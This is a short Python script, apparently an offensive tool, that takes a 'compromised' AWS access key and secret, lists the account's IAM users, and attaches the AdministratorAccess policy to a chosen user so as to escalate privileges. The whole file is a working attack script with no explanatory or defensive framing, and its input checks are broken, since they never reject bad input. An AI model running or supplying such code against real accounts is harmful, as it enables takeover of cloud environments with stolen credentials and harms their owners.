import boto3, json, os, subprocess
from boto3.session import Session

def connect_to_aws():
    global iam_client

    access_key = input("Copy and paste the compromised AWS access key ID here: ")
    secret_key = input("Copy and paste the compromised AWS secret access key here: ")
    region = input("Enter a region here: ")

    while True:
        try:
            aws_regions = [
                'ap-east-1', 'ap-northeast-1', 'ap-northeast-2', 'ap-south-1', 'ap-southeast-1', 'ap-southeast-2', 'ca-central-1', 
                'cn-north-1', 'cn-northwest-1', 'eu-central-1', 'eu-north-1', 'eu-west-1', 'eu-west-2', 'eu-west-3', 
                'sa-east-1', 'us-east-1', 'us-east-2', 'us-gov-east-1', 'us-gov-west-1', 'us-west-1', 'us-west-2'
            ]
            region in aws_regions
            break
        except ValueError:
            print("Enter a valid AWS region.")

    session = Session(
        aws_access_key_id='{}'.format(access_key),
        aws_secret_access_key='{}'.format(secret_key),
        region_name='{}'.format(region)
    )

    # Connect to the AWS IAM service.
    iam_client = session.client('iam')

def select_user():
    global get_iam_user, chosen_user

    get_iam_user = iam_client.list_users()['Users']
    user_list = []

    # View the IAM users.
    for i in range(len(get_iam_user)):
        user_list.append(get_iam_user[i]['UserName'])
        print("{0}. {1}".format(i + 1, user_list[i]))

    user_num = input("Enter the list number of the user you want to make an admin: ")

    while True:
        try:
            user_num = int(user_num)
            break
        except ValueError:
            print("This is not a number.")
        try:
            user_num <= len(user_list)
            break
        except ValueError:
            print("The number must be less than or equal to the number of IAM users.")
    
    chosen_user = user_list[user_num - 1]

def escalate_privilege():
    iam_client.attach_user_policy(
        UserName = '{}'.format(chosen_user), 
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )

def view_metadata():
    print("{}'s user policies".format(chosen_user))
    print(json.dumps(
            iam_client.list_attached_user_policies(
                UserName = '{}'.format(chosen_user)
            )['AttachedPolicies'],
            indent = 1,
            default = str
        )
    )

if __name__ == "__main__":
    connect_to_aws()
    select_user()
    escalate_privilege()
    view_metadata()
